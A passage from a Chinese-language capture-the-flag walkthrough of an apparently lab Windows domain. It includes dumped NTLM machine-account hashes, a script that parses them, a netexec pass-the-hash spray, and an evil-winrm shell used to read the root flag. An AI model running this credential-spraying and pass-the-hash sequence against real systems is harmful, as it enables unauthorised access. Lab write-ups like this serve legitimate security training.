MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::

```

文件里边的内容看着像是`NTLMhash` ，使用脚本做处理得到可以进行爆破的状态

```python
with open('backup_extract.txt','r') as file1:
    data = file1.read()
    lines = data.splitlines()
with open('ntlm.txt','w+') as file2:
    for line in lines:
        file2.write(line[line.rfind(':')-34:line.rfind(':')-2]+'\n')
with open('usernmae2.txt','w+') as file3:
    for line in lines:
        file3.write(line[:line.find(':')]+'\n')
```

经过脚本处理后得到`NTLM.txt`和`username2.txt`

```python
// username2.txt
WebServer$
DatabaseServer$
CitrixServer$
FileServer$
MailServer$
BackupServer$
ApplicationServer$
PrintServer$
ProxyServer$
MonitoringServer$
```

```python
// NTLM.txt
c47b45f5d4df5a494bd19f13e14f7902
406b424c7b483a42458bf6f545c936f7
48fc7eca9af236d7849273990f6c5117
e41da7e79a4c76dbd9cf79d1cb325559
46a4655f18def136b3bfab7b0b4e70e3
46a4655f18def136b3bfab7b0b4e70e3
8cd90ac6cba6dde9d8038b068c17e9f5
b8a38c432ac59ed00b2a373f4f050d28
4e3f0bb3e5b6e3e662611b1a87988881
48fc7eca9af236d7849273990f6c5117
```

### 使用netexec进行爆破

像是进行爆破PTH，得到用户`FileServer$` 的凭据

```python
nxc smb 192.168.56.128 -u usernmae2.txt -H ntlm.txt
SMB         192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

然后使用`evil-winrm`进行获得`shell`

```python
evil-winrm -i 192.168.56.128 -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FileServer$\Documents>

```

进行`root.flag`读取

### Root Flag

```python
*Evil-WinRM* PS C:\Users\administrator\Desktop> type root.txt
a9564ebc3289b7a14551baf8ad5ec60a
```